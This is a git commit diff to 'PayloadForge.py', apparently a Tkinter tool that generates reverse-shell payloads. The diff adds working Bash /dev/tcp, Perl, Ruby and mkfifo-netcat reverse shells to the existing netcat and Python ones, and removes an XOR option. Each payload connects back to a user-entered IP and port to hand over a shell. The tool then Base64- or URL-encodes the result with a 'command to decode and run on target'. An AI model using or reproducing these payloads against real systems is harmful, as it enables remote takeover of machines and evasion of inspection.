05e172e9f97bd289caa315a52479b6b77440a94e
Johnny Watts <warhamr1488@gmail.com>
2023-12-22 13:50:03 -0500

    Update PayloadForge.py

--- PayloadForge.py
+++ PayloadForge.py
@@ -12,76 +12,83 @@ def generate_payload():
     # Generate payload based on user choices
     payload = ""
     if shell_choice == "Netcat":
-        payload = f"nc -e /bin/sh {ip} {port}"
+        netcat_version_fix = netcat_var.get()
+        if netcat_version_fix:
+            payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
+        else:
+            payload = f"nc -e /bin/sh {ip} {port}"
     elif shell_choice == "Python":
         payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
+    elif shell_choice == "Bash":
+        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    elif shell_choice == "Perl":
+        payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+    elif shell_choice == "Ruby":
+        payload = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 
     # Encode payload if selected
     encoded_payload = payload
+    decoded_command = f"echo {encoded_payload} | sh"
     if encoding_choice == "Base64":
         encoded_payload = base64.b64encode(payload.encode()).decode()
         decoded_command = f"echo {encoded_payload} | base64 -d | sh"
-    elif encoding_choice == "XOR":
-        # Implement XOR encoding (customize as needed)
-        encoded_payload = xor_encode(payload)
-        decoded_command = f"echo {encoded_payload} | xor_decode | sh"
     elif encoding_choice == "URL Encoding":
         encoded_payload = urllib.parse.quote_plus(payload)
         decoded_command = f"echo {encoded_payload} | sed 's/+/ /g;s/%/\\\\x/g' | xargs -0 printf | sh"
-    else:
-        decoded_command = f"echo {payload} | sh"
 
     # Display generated payload, encoded payload, and command in the GUI
     output_text.delete(1.0, tk.END)
-    output_text.insert(tk.END, f"Plain Text Payload:\n{payload}\n\nEncoded Payload:\n{encoded_payload}\n\nCommand to decode and run on target:\n{decoded_command}")
+    output_text.insert(tk.END,
+                       f"Plain Text Payload:\n{payload}\n\nEncoded Payload:\n{encoded_payload}\n\nCommand to decode and run on target:\n{decoded_command}")
 
-def xor_encode(payload):
-    # Example XOR encoding function (customize as needed)
-    key = 0xAB  # Example XOR key (change as desired)
-    encoded_payload = ''.join([chr(ord(c) ^ key) for c in payload])
-    return encoded_payload
 
 # Create GUI
 root = tk.Tk()
 root.title("Payload Forge")
-root.geometry("470x300")
+root.geometry("590x450")
 
 # Shell choices
 shell_var = tk.StringVar()
 shell_var.set("Netcat")
 shell_label = tk.Label(root, text="Select Shell:")
-shell_label.grid(row=0, column=0)
-shell_choices = ["Netcat", "Python"]
+shell_label.place(x=10, y=10)
+shell_choices = ["Netcat", "Python", "Bash", "Perl", "Ruby"]
 for i, choice in enumerate(shell_choices):
     rb = tk.Radiobutton(root, text=choice, variable=shell_var, value=choice)
-    rb.grid(row=0, column=i+1)
+    rb.place(x=120 + 75 * i, y=10)
+
+# Netcat version fix option for mismatched versions
+netcat_var = tk.BooleanVar()
+netcat_var.set(False)  # Default to not fixing Netcat versions
+netcat_checkbox = tk.Checkbutton(root, text="Fix Netcat Version Mismatch", variable=netcat_var)
+netcat_checkbox.place(x=120, y=45)
 
 # Encoding choices
 encoding_var = tk.StringVar()
 encoding_var.set("Base64")
 encoding_label = tk.Label(root, text="Select Encoding:")
-encoding_label.grid(row=1, column=0)
-encoding_choices = ["Base64", "XOR", "URL Encoding", "None"]
+encoding_label.place(x=10, y=85)
+encoding_choices = ["Base64", "URL Encoding", "None"]
 for i, choice in enumerate(encoding_choices):
     rb = tk.Radiobutton(root, text=choice, variable=encoding_var, value=choice)
-    rb.grid(row=1, column=i+1)
+    rb.place(x=120 + 100 * i, y=10 + 20 * (len(shell_choices) + 0))
 
 # IP and Port entries
 ip_label = tk.Label(root, text="Enter IP:")
-ip_label.grid(row=2, column=0)
+ip_label.place(x=10, y=10 + 25 * (len(shell_choices) + 2))
 ip_entry = tk.Entry(root)
-ip_entry.grid(row=2, column=1)
+ip_entry.place(x=120, y=10 + 25 * (len(shell_choices) + 2))
 port_label = tk.Label(root, text="Enter Port:")
-port_label.grid(row=2, column=2)
+port_label.place(x=300, y=10 + 25 * (len(shell_choices) + 2))
 port_entry = tk.Entry(root)
-port_entry.grid(row=2, column=3)
+port_entry.place(x=400, y=10 + 25 * (len(shell_choices) + 2))
 
 # Generate button
 generate_button = tk.Button(root, text="Generate Payload", command=generate_payload)
-generate_button.grid(row=3, columnspan=5)
+generate_button.place(x=230, y=10 + 25 * (len(shell_choices) + 3))
 
 # Output text area
-output_text = tk.Text(root, height=10, width=50)
-output_text.grid(row=4, columnspan=5)
+output_text = tk.Text(root, height=10, width=70)
+output_text.place(x=10, y=10 + 25 * (len(shell_choices) + 5))
 
 root.mainloop()
